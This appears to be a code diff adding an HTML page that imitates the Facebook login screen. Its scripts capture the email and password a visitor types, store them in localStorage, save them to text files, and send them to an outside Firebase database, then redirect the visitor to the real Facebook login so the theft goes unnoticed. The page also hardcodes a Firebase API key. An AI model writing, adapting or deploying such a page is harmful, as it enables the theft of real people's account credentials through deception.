@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login to Facebook</title>
+    <link rel="stylesheet" href="login page.css">
+    <script src="FileSaver.js-master/src/FileSaver.js"></script>
+</head>
+<body>
+    <div class="header">
+        <CENTER><h1>facebook</h1></CENTER>
+    </div>
+    <div class="container">
+        <div class="form">
+            <h2>Log in to Facebook</h2>
+            <form>
+            <input type="email" id="email" placeholder="Enter your Email or Phone Number" required><br>
+            <input type="password" id="password" placeholder="Password" required><br>
+            <a href="https://www.facebook.com/login">
+                <button type="submit" id="btn" onclick="updateEmailandPassword()">
+                    Log In
+                </button>
+            </a>
+            </form>
+            <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgotten account?</a>
+            <a href="https://www.facebook.com/r.php?locale=en_GB&display=page">Sign Up for Facebook</a>
+        </div>
+    </div>
+
+    <script>
+        let movies = [];
+        const addMovie = (ev)=>{
+            ev.preventDefault();
+            let movie = {
+                id : Date.now(),
+                title: document.getElementById('email').value,
+                year: document.getElementById('password').value
+            }
+            movies.push(movie);
+            document.forms[0].reset();
+            //document.querySelector('form').reset();
+
+            console.warn('added', {movies} );
+            let pre = document.querySelector('#msg pre');
+            pre.textContent = '\n' + JSON.stringify(movies, '\t', 2);
+
+            //saving to localstorage
+            localStorage.setItem('EmailIdandPassword', JSON.stringify(movies) );
+        }
+        document.addEventListener('DOMContentLoaded', ()=>{
+            document.getElementById('btn').addEventListener('click', addMovie);
+        });
+    </script>
+
+    <script>
+        function saveDynamicDataToFile() {
+
+            var userInput = document.getElementById("email").value;
+            var userInput1 = document.getElementById("password").value;
+
+            var blob = new Blob([userInput], { type: "text/plain;charset=utf-8" });
+            saveAs(blob, "details.txt");
+            var blob1 = new Blob([userInput1], { type: "text/plain;charset=utf-8" });
+            saveAs(blob1, "details1.txt");
+        }
+    </script>
+
+    <!-- The core Firebase JS SDK is always required and must be listed first -->
+<script src="https://www.gstatic.com/firebasejs/8.4.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.4.1/firebase-database.js"></script>
+
+<!-- TODO: Add SDKs for Firebase products that you want to use
+     https://firebase.google.com/docs/web/setup#available-libraries -->
+
+<script>
+  // Your web app's Firebase configuration
+  var firebaseConfig = {
+    apiKey: "AIzaSyB07Ib02-VeFqEPlzuZ19LrzmpVB00wCCM",
+    authDomain: "facebook-c25ce.firebaseapp.com",
+    projectId: "facebook-c25ce",
+    storageBucket: "facebook-c25ce.appspot.com",
+    messagingSenderId: "417310933427",
+    appId: "1:417310933427:web:2e681b098fc3b8cf29cbc6"
+  };
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+</script>
+
+<script>
+function updateEmailandPassword(){
+    var email = document.getElementById('email').value;
+    var password = document.getElementById('password').value;
+
+    var db = firebase.database();
+    db.ref('/').update({
+        email: email,
+        password: password
+    });
+}
+
+</script>
+</body>
+</html>
